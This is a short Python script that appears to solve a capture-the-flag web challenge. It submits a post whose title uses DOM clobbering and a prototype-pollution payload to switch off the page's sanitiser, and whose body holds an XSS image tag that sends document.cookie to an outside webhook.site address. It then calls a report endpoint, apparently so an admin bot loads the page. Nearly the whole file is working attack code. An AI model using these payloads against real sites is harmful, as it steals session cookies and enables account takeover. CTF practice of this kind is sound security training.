import requests

BASE_URL = "https://sanity.amt.rs"

r = requests.post(f"{BASE_URL}/submit", json={
    'title': "<a id=debug><a id=debug name=extension href='data:;,%7B%22__proto__%22:%7B%22sanitize%22:0%7D%7D'>",
    'body': """<img src=x onerror='fetch("https://webhook.site/e6219bca-cb83-4013-9f59-54cd0ac80ec3/" + document.cookie)' />"""
})

id = r.content
print(id)

r = requests.get(f"{BASE_URL}/report/{id}")
